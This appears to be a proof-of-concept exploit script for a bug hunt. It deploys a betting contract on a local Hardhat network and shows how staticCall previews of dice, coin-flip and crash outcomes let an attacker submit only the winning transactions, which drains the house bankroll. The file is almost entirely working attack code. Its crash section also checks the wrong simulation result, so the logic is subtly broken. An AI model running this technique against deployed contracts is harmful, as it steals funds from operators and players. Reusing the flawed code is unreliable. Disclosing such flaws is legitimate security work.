#!/usr/bin/env node
"use strict";
/**
 * Pass 4 — staticCall cherry-pick PoC on Hardhat in-process network.
 * Run: node CursorBugHunt/fork-staticCall-poc.js
 */
const hre = require("hardhat");
const { ethers } = hre;

function winningDiceParams(roll) {
  if (roll < 9899) {
    const target = Math.max(roll + 1, 100);
    if (target <= 9900) return { target, rollOver: false };
  }
  if (roll > 99) {
    const target = Math.min(roll - 1, 9899);
    if (9999 - target >= 100) return { target, rollOver: true };
  }
  return { target: 5000, rollOver: roll > 5000 };
}

async function main() {
  console.log("=".repeat(72));
  console.log("Pass 4 — staticCall cherry-pick PoC (Hardhat network)");
  console.log("=".repeat(72));

  const [deployer, treasury, attacker, host] = await ethers.getSigners();
  const Game = await ethers.getContractFactory("CoinFlipBetting");
  const game = await Game.deploy(treasury.address);
  await game.waitForDeployment();
  const addr = await game.getAddress();

  const bet = ethers.parseEther("0.01");
  await game.connect(deployer).fundHouse({ value: ethers.parseEther("10") });
  await game.connect(attacker).deposit({ value: ethers.parseEther("0.2") });
  await game.connect(host).deposit({ value: ethers.parseEther("0.1") });
  await game.connect(host).createHostRoom(ethers.parseEther("0.08"), "PoC table");

  // ── 1. Dice: probe roll via staticCall, pick winning target, real tx ──
  const bank0 = await game.houseBankroll();
  const bal0 = await game.balances(attacker.address);
  const probe = await game.connect(attacker).playDice.staticCall(bet, 5000, false);
  const roll = Number(probe[1]);
  const winParams = winningDiceParams(roll);
  const sim = await game.connect(attacker).playDice.staticCall(bet, winParams.target, winParams.rollOver);
  console.log("\n[1] playDice staticCall probe");
  console.log("    roll=" + roll + " probe_won=" + probe[2] + " posthoc_won=" + sim[2]);
  console.log("    chosen target=" + winParams.target + " rollOver=" + winParams.rollOver);

  if (sim[2]) {
    const tx = await game.connect(attacker).playDice(bet, winParams.target, winParams.rollOver, { gasLimit: 500000n });
    await tx.wait();
    const bal1 = await game.balances(attacker.address);
    const bank1 = await game.houseBankroll();
    const delta = bal1 - bal0;
    console.log("    REAL TX submitted — balance " + ethers.formatEther(bal0) + " → " + ethers.formatEther(bal1));
    console.log("    house bankroll " + ethers.formatEther(bank0) + " → " + ethers.formatEther(bank1));
    console.log("    attacker profit wei: " + delta.toString() + (delta < 0n ? " (gasleft desync: sim won, chain lost)" : ""));
  } else {
    console.log("    skipped real tx after post-hoc win params (sim loss on submit params)");
  }

  // ── 2. Host table: try both sides via staticCall, submit winning side only ──
  await game.connect(attacker).deposit({ value: ethers.parseEther("0.01") });
  let hostPick = null;
  for (const heads of [true, false]) {
    const won = await game.connect(attacker).playHostRoom.staticCall(1, bet, heads);
    console.log("\n[2] playHostRoom staticCall wantsHeads=" + heads + " → playerWon=" + won);
    if (won) { hostPick = heads; break; }
  }
  if (hostPick !== null) {
    const tx2 = await game.connect(attacker).playHostRoom(1, bet, hostPick);
    await tx2.wait();
    console.log("    REAL TX submitted with wantsHeads=" + hostPick);
    console.log("    attacker balance: " + ethers.formatEther(await game.balances(attacker.address)));
  }

  // ── 3. Crash: simulate, submit only if won at 1.50x ──
  const targetX100 = 150n;
  const crashSim = await game.connect(attacker).playCrash.staticCall(bet, targetX100);
  console.log("\n[3] playCrash staticCall target=1.50x");
  console.log("    crashX100=" + crashSim[1].toString() + " won=" + crashSim[2]);
  if (sim[2]) {
    try {
      const tx = await game.connect(attacker).playCrash(bet, targetX100, { gasLimit: 500000n });
      await tx.wait();
      console.log("    REAL TX submitted (cherry-picked win)");
    } catch (e) {
      console.log("    sim win but real tx reverted (gasleft desync or bankroll): " + (e.message || e).slice(0, 80));
    }
  } else {
    console.log("    skipped real tx (simulated loss — zero-cost abort)");
  }

  // ── 4. Monte Carlo: cherry-pick vs blind play (50 rounds, skip on sim loss) ──
  await game.connect(deployer).fundHouse({ value: ethers.parseEther("20") });
  await game.connect(attacker).deposit({ value: ethers.parseEther("1") });
  let blindNet = 0n;
  let cherryNet = 0n;
  let cherryPlays = 0;
  const rounds = 50;
  for (let i = 0; i < rounds; i++) {
    const b = ethers.parseEther("0.001");
    if ((await game.balances(attacker.address)) < b) break;
    await (await game.connect(attacker).playDice(b, 5000, false)).wait();
    const bal = await game.balances(attacker.address);
    blindNet = bal - ethers.parseEther("1.2");
  }
  await game.connect(attacker).deposit({ value: ethers.parseEther("1") });
  const cherryStart = await game.balances(attacker.address);
  for (let i = 0; i < rounds; i++) {
    const b = ethers.parseEther("0.001");
    if ((await game.balances(attacker.address)) < b) break;
    try {
      const p = await game.connect(attacker).playDice.staticCall(b, 5000, false);
      const wp = winningDiceParams(Number(p[1]));
      const wsim = await game.connect(attacker).playDice.staticCall(b, wp.target, wp.rollOver);
      if (!wsim[2]) continue;
      cherryPlays++;
      await (await game.connect(attacker).playDice(b, wp.target, wp.rollOver, { gasLimit: 500000n })).wait();
    } catch (e) {
      console.log("    cherry round " + i + " skipped: " + (e.message || e).slice(0, 60));
    }
  }
  cherryNet = (await game.balances(attacker.address)) - cherryStart;
  console.log("\n[4] Monte Carlo " + rounds + " dice rounds");
  console.log("    blind play balance delta wei:  " + blindNet.toString());
  console.log("    cherry-pick plays submitted:   " + cherryPlays + " (sim-win only)");
  console.log("    cherry-pick balance delta wei: " + cherryNet.toString());

  console.log("\n" + "=".repeat(72));
  console.log("PoC complete — staticCall reveals outcome; real tx is optional for attacker.");
  console.log("=".repeat(72));
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
